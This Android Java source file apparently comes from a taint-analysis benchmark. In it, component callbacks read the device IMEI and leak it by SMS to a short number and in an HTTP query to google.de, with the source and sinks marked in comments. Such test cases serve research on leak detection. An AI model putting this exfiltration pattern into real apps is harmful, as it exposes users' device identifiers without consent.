package de.ecspride;

import android.app.Application;
import android.content.ComponentCallbacks2;
import android.content.Context;
import android.content.res.Configuration;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MyApplication extends Application {
	
	ComponentCallbacks2 callbacks = new ComponentCallbacks2() {
		
		String imei;
		
		@Override
		public void onLowMemory() {
	        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			imei = telephonyManager.getDeviceId(); //source
		}
		
		@Override
		public void onConfigurationChanged(Configuration newConfig) {
	    	SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak

			try {
				connect(imei);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		private void connect(String data) throws IOException {
			String URL = "http://www.google.de/search?q=";
			URL = URL.concat(data);
			java.net.URL url = new URL(URL);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
			conn.setRequestMethod("GET");
			conn.setDoInput(true);
			// Starts the query
			conn.connect();

			InputStream is = conn.getInputStream();
			if (is == null)
				return;
			StringBuilder sb = new StringBuilder();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));
			String line = null;
			try {
				while ((line = br.readLine()) != null)
					sb.append(line);
			} finally {
				br.close();
				is.close();
			}
			Log.d(getClass().getSimpleName(), sb.toString());
		}
		
		@Override
		public void onTrimMemory(int level) {
			// TODO Auto-generated method stub
			
		}
	};
	
	@Override
	public void onCreate() {
		super.onCreate();
		this.registerComponentCallbacks(callbacks);
	}
	
	@Override
	public void onTerminate() {
		super.onTerminate();
		this.unregisterComponentCallbacks(callbacks);
	}

}
